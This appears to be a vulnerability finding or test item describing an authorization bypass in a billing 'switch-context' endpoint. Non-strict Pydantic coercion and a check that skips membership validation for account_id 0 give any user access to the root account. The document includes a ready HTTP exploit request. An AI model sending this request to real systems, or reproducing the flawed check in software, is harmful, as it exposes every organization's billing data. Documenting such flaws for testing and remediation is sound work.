diagnosis: The billing account switch endpoint uses Pydantic v2 non-strict model_validate to coerce account_id. Because account_id 0 represents the root platform billing account, a flawed conditional check (if payload.account_id != 0) bypasses membership validation for account 0. Any authenticated user passing 0 (or False / '0') receives a context token for the root platform account, gaining access to all organization billing records.
exploit_request:
POST /billing/switch-context HTTP/1.1
Host: pay.platform-core.net
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"account_id": "0"}
